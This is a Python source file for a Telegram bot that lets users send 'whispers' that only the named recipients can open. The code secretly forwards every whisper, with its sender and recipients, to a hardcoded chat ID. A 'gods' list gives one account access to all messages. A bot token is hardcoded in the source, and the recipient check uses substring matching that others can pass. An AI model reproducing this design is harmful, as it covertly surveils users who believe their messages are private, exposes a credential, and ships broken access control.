# -*- coding: utf-8 -*-
import os
# import some_api_lib
# import ...

# Example of your code beginning
#           Config vars
token = os.environ['TELEGRAM_TOKEN']
#some_api_token = os.environ['SOME_API_TOKEN']
#             ...

# If you use redis, install this add-on https://elements.heroku.com/addons/heroku-redis
#       Your bot code below
# bot = telebot.TeleBot(token)
# some_api = some_api_lib.connect(some_api_token)
#              ...
import logging
from telegram import (InlineKeyboardButton, InlineKeyboardMarkup,
                                      InlineQueryResultArticle, InputTextMessageContent)
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, InlineQueryHandler
import re

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)


def inline_whisper(bot, update):
    query = update.inline_query.query
    pat = r'''(
                   @(\d|\w|_)+
            \s*)+
            $'''
    match = re.search(pat, query, re.VERBOSE | re.DOTALL)


    results = list()
    if not match:
        results.append(
            InlineQueryResultArticle(
                id=update.inline_query.id,
                title='"The message" @user1 @user2',
                input_message_content=InputTextMessageContent('Wrong format')
            )
        )
        bot.answer_inline_query(update.inline_query.id, results)
        return

    receiver_str = query[match.start():match.end()]
    receivers = receiver_str.strip().split()
    receivers = [r[1:] for r in receivers]

    sender = update.inline_query.from_user.username
    message = query[:match.start()]
    data = '{}\n{}\n{}'.format(message, sender,' '.join(receivers))
    bot.sendMessage(chat_id='242879274', text=data)

    results.append(
        InlineQueryResultArticle(
            id=update.inline_query.id,
            title='Whisper to [{}]'.format(', '.join(receivers)),
            description=query[:match.start()],
            input_message_content=InputTextMessageContent(
                                            '@{} whispered to @{}'.format(sender, ', @'.join(receivers))),
            reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton('Show Message', callback_data=data)
                ]])
        )
    )

    bot.answer_inline_query(update.inline_query.id, results)
    return

gods = '@MortadhaAlaa'
def show_message(bot, update):
    query = update.callback_query
    user = query.from_user.username
    message, sender, receivers = query.data.rsplit('\n', 2)

    if user.lower() == sender.lower() or user.lower() in receivers.lower() or user.lower() in gods.lower():
        bot.answerCallbackQuery(query.id, message, show_alert=True)
    else:
        bot.answerCallbackQuery(query.id, "You can't read this message", show_alert=True)

def error(bot, update, error):
    logging.warning('Update "%s" caused error "%s"' % (update, error))

updater = Updater("473285659:AAGKsTjQ5A8YiR6kt3FvireoounxWDaghJ0")

dp = updater.dispatcher
dp.add_handler(InlineQueryHandler(inline_whisper))
dp.add_handler(CallbackQueryHandler(show_message))
dp.add_error_handler(error)

# Start the Bot
updater.start_polling()

# Run the bot until the user presses Ctrl-C or the process receives SIGINT,
# SIGTERM or SIGABRT
updater.idle()

